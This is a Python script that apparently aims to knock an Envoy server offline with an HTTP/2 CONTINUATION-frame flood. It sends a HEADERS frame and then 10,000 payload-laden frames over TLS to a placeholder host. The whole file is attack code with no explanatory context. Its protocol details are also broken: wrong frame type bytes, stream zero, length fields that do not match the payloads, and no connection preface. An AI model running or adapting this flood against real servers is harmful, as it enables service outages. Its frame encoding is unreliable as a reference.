import socket
import ssl

# Target Envoy server details
TARGET_HOST = 'example.com'
TARGET_PORT = 443

# Number of CONTINUATION frames to send
NUM_CONTINUATION_FRAMES = 10000

# Payload for the CONTINUATION frames
CONTINUATION_PAYLOAD = b'\x00' * 1024  # Adjust payload size as needed

def send_continuation_frames():
    try:
        # Create a TCP socket
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Wrap the socket with SSL/TLS
        ssl_socket = ssl.wrap_socket(client_socket)

        # Connect to the target server
        ssl_socket.connect((TARGET_HOST, TARGET_PORT))

        # Send HEADERS frame
        headers_frame = b'\x00\x00\x04\x01\x00\x00\x00\x01\x00\x00\x00\x01\x82\x84'
        ssl_socket.send(headers_frame)

        # Send CONTINUATION frames
        for _ in range(NUM_CONTINUATION_FRAMES):
            continuation_frame = b'\x00\x00\x00\x01\x00\x00\x00\x00\x00' + CONTINUATION_PAYLOAD
            ssl_socket.send(continuation_frame)

        print(f"Sent {NUM_CONTINUATION_FRAMES} CONTINUATION frames successfully.")
    
    except Exception as e:
        print(f"An error occurred: {str(e)}")
    
    finally:
        ssl_socket.close()

if __name__ == "__main__":
    send_continuation_frames()
